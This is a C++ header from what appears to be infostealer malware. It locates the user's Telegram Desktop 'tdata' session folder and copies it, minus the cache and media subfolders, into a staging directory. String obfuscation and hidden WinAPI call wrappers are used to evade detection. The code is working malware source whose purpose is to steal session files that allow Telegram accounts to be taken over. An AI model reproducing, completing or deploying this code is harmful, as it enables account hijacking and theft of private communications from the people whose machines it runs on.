#ifndef TELEGRAM_HPP
#define TELEGRAM_HPP

#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"
#include "obfusheader.h"
namespace fs = std::filesystem;

namespace Telegram {
    inline void Extract(const std::string& baseDir);
}

inline void CopyDirExclude(const std::string& srcDir, const std::string& dstDir, const std::vector<std::string>& excludeDirs) {
    for (const auto& entry : fs::recursive_directory_iterator(srcDir, fs::directory_options::skip_permission_denied)) {
        std::string relativePath = fs::relative(entry.path(), srcDir).string();

        std::replace(relativePath.begin(), relativePath.end(), '/', '\\');

        bool shouldSkip = false;
        for (const auto& exclude : excludeDirs) {
            if (relativePath.find(exclude) == 0) {  
                shouldSkip = true;
                break;
            }
        }
        if (shouldSkip) continue; 

        std::string destinationPath = dstDir + "\\" + relativePath;

        if (fs::is_directory(entry)) {
            HiddenCalls::CreateDirectoryA(destinationPath.c_str(), NULL);
        }
        else {
            HiddenCalls::CopyFileA(entry.path().string().c_str(), destinationPath.c_str(), FALSE);
        }
    }
}

inline void Telegram::Extract(const std::string& baseDir) {
    char* userProfilePath = nullptr;
    size_t requiredSize = 0;
    _dupenv_s(&userProfilePath, &requiredSize, OBF("USERPROFILE"));

    if (!userProfilePath) return;

    std::string pathTele = std::string(userProfilePath) + OBF("\\AppData\\Roaming\\Telegram Desktop\\tdata");
    free(userProfilePath);

    if (!fs::exists(pathTele)) return;

    std::string telegramSession = baseDir + OBF("\\Telegram");
    HiddenCalls::CreateDirectoryA(telegramSession.c_str(), NULL);


    CopyDirExclude(pathTele, telegramSession, { OBF("user_data"), OBF("emoji"), OBF("tdummy"), OBF("user_data#2"), OBF("user_data#3"), OBF("webview"), OBF("user_data#4"), OBF("user_data#5"), OBF("user_data#6") });
}

#endif
